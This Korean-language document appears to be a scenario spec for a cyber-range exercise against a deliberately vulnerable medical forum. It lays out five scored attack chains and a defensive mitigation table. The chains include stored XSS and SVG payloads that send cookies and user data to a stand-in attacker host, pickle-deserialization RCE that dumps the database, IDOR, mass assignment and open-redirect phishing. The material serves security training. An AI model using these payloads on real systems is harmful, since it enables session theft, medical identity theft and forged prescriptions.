# MediForum — HARD mode 5 Chain (P13 Phase 3)

> **HARD 모드**: 의료 익명 커뮤니티 — Stored XSS / PII bulk / IDOR / DM 위조 chain 5종.
> 의사·환자 신뢰 관계를 악용한 사회공학 + 기술 chain. 점수 +290.

## 강조 차별점 (vs Normal)
- **다중 XSS sink**: 게시글/댓글/프로필 bio/DM/SVG avatar — 5 vector chain
- **의료 PII 특수성**: SSN + 진단/처방 + 의사-환자 매핑 → HIPAA-급 leak
- **Trust impersonation**: 의사 계정 인수 → 환자 처방 위조 → 사회공학 다음 단계
- **Mass assignment + DM**: profile role + DM body 결합으로 self-XSS → admin XSS

---

## Chain 1: 의사 DM XSS → cookie 탈취 → 처방 위조 (Doctor Impersonation)
**점수 +70** · **MITRE T1583.001 + T1539**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 1.1 | 의사 user_id 조회 | `GET /api/users` | V07 PII bulk | doctor user_id |
| 1.2 | 의사에게 DM 발송, body 에 stored XSS payload | `POST /dm/send to=2 body=<script>fetch('/api/users').then(r=>r.json()).then(j=>fetch('//attacker/'+btoa(JSON.stringify(j)))</script>` | V18 stored XSS in DM | DM id |
| 1.3 | 의사가 /dm 페이지 열면 cookie + PII 탈취 (V12 cookie HttpOnly 미설정) | (passive 대기) | V18 + V12 | external receiver hit |
| 1.4 | 탈취한 doctor session 으로 medical record 작성 — 위조 처방 | `POST /api/medical-records` (doctor token) | normal flow + V08 broken auth | new record_id |
| 1.5 | victim 환자 record 에 위조 처방 추가 | 같은 endpoint patient_id=4 | V09 IDOR + V12 excessive agency variant | 처방 등록 |

**완주 시**: 의사 명의 위조 처방 (예: 위험 약물 과다 처방) + cookie 영구 탈취. BLUE 가 cookie HttpOnly 적용해도 #1.4 doctor 세션 자체 인수 후 정상 flow 사용.

---

## Chain 2: SVG avatar XSS → Admin DM 인수 (SVG → Admin Takeover)
**점수 +60** · **MITRE T1059.007 (JavaScript) + T1185**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 2.1 | SVG 파일에 XSS payload 삽입 후 avatar upload | `POST /profile/avatar file=<svg xmlns="..." onload="fetch('//attacker/admin?c='+document.cookie)"/>` | V19 SVG XSS | upload path |
| 2.2 | 업로드된 SVG 직접 호출 — Content-Type: image/svg+xml | `GET /uploads/u<id>_<ts>_payload.svg` | V19 + path predictability | SVG 렌더 + alert |
| 2.3 | profile bio 에 SVG link 삽입 → 다른 사용자 프로필 방문 시 trigger | `POST /profile/edit bio=<img src='/uploads/.../payload.svg'>` | V03 + V19 chain | bio 저장 |
| 2.4 | admin 이 user 검색하면 bio 렌더링 → admin cookie 탈취 | passive 대기 — admin 의 `/search?q=...` | V03 stored XSS in bio + V12 | admin token |
| 2.5 | admin token 으로 모든 DM dump (privacy 침해) | `GET /api/admin/dms` | V10 broken admin auth | 모든 DM |

**완주 시**: admin 권한 + 모든 DM 노출 (의사-환자 사적 대화). BLUE 가 SVG MIME 차단해도 V03 profile bio XSS 단독으로 진행.

---

## Chain 3: SSN bulk → IDOR record → 사회공학 (Medical Identity Theft)
**점수 +60** · **MITRE T1530 + T1589.002**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 3.1 | search 로 모든 사용자 SSN/phone 추출 | `GET /search?q=` (빈 검색 = all) | V16 PII overshare | 6 user PII |
| 3.2 | medical-records 전체 dump — 누가 어떤 진단 받는지 | `GET /api/medical-records` | V08 PII leak | 4 record |
| 3.3 | IDOR 로 특정 환자 (alice) 모든 record 추출 | `GET /api/medical-records/<id>` enumerate | V09 IDOR | alice 진단/처방 |
| 3.4 | 추출 PII + 진단 정보로 victim 에게 사회공학 phishing | (out-of-band) — 위조 의사 명의 SMS "처방 변경 안내" | V07 + V08 + V09 | victim 클릭 |
| 3.5 | open redirect 로 phishing 정상 도메인 우회 | `https://medi.kr/go?to=//attacker/login` | V20 open redirect | redirect 성공 |

**완주 시**: 100% 신뢰 가능한 phishing 자료 + 정상 도메인 wrapper. BLUE 가 PII 마스킹해도 #3.4 사회공학 진행 가능.

---

## Chain 4: API token leak → impersonate → mass assign role (API Token Cascade)
**점수 +50** · **MITRE T1552.001 + T1078**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 4.1 | URL query 로 api_key 전송 → access log 에 기록 | `GET /api/users/<id>?api_key=ak-...` | V11 API key in URL | log leak |
| 4.2 | 다른 user 의 api_key 로 API 호출 (IDOR variant) | `GET /api/users/<other_id>?api_key=<leaked>` | V11 + V09 IDOR | 다른 user data |
| 4.3 | mass assignment 로 본인 role=admin / verified=1 변경 | `POST /api/profile {"role":"admin","verified":1,"api_key":"new"}` | V17 mass assign | role:admin |
| 4.4 | 새 admin token 으로 hardcoded admin token 우회 시도 | `X-Admin-Token: MEDIFORUM-ADMIN-2026-DEV` | V22 hardcoded admin | admin 권한 |
| 4.5 | session id counter 예측 (V14) → 다음 사용자 자동 인수 | cookie `MFSID=sess-<n+1>` | V14 predictable session | 다른 세션 hijack |

**완주 시**: 영구 admin token + 다른 사용자 세션 자동 인수. BLUE 가 mass assign role 차단해도 V22 hardcoded token 으로 진행.

---

## Chain 5: pickle import → RCE → DB dump (Conversation Import → Server)
**점수 +50** · **MITRE T1190 + T1005**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 5.1 | pickle payload 생성 — `os.system('id > /tmp/pwn')` | (local) python pickle | V21 pickle | payload |
| 5.2 | conversation import endpoint 로 pickle 전달 | `POST /api/conv/import` raw pickle | V21 insecure deserial | code exec |
| 5.3 | RCE 로 medi forum DB 직접 dump — sqlite3 mediforum.db | `os.popen('sqlite3 mediforum.db .dump')` | V21 + filesystem | DB 전체 |
| 5.4 | 추출된 password 평문 (DB column password) → 모든 user 로그인 | DB 의 password 평문 | V07 + V08 + plaintext password | login 가능 |
| 5.5 | verbose error endpoint 로 stack + env 추가 leak | `GET /api/debug/echo?q=test` | V21 verbose error | env 노출 |

**완주 시**: 모든 평문 password + DB + env 노출. BLUE 가 pickle 차단해도 #5.5 verbose error 로 reconnaissance 진행.

---

## BLUE 권장 차단 (Hard 모드)

| 차단 영역 | 우선순위 | 도구 |
|-----------|----------|------|
| Cookie HttpOnly + Secure + SameSite=Strict | High | Flask `set_cookie(httponly=True, secure=True, samesite='Strict')` |
| DOMPurify 또는 bleach 로 모든 XSS sink sanitize | High | python-bleach + frontend DOMPurify |
| File upload Content-Type + magic bytes 검증 | High | python-magic + extension allowlist |
| API auth — JWT 또는 session cookie 강제 (URL token 금지) | High | FastAPI Depends(get_user) |
| RBAC + medical_records.patient_id 검증 | High | row-level access check |
| pickle.loads → JSON 또는 protobuf 로 교체 | High | `json.loads` only |
| password 평문 → bcrypt + salt | High | passlib bcrypt |
| Verbose error redact (production mode) | Med | Flask `app.debug = False` + custom 500 |
| CORS — 명시적 origin allowlist (no `*`) | Med | flask-cors + whitelist |
| API rate-limit per token | Med | Flask-Limiter |

---

## 점수 가중

| chain | 단순 step 합 | chain 완주 보너스 | 총 |
|-------|-------------|-------------------|-----|
| Chain 1 의사 DM XSS | +35 | +35 | **+70** |
| Chain 2 SVG → Admin | +30 | +30 | **+60** |
| Chain 3 SSN → 사회공학 | +30 | +30 | **+60** |
| Chain 4 API token cascade | +25 | +25 | **+50** |
| Chain 5 pickle → DB dump | +25 | +25 | **+50** |
| **합** | **+145** | **+145** | **+290** |

5 chain 완주 시 +290 점 (Normal +110 의 2.6배 — 의료 시나리오의 사회공학 비중 반영).

---

## 운영자 점검

```bash
bash contents/vuln-sites/up.sh up   # mediforum :3003 그대로
# Battle admin UI: site=mediforum + difficulty=hard
```
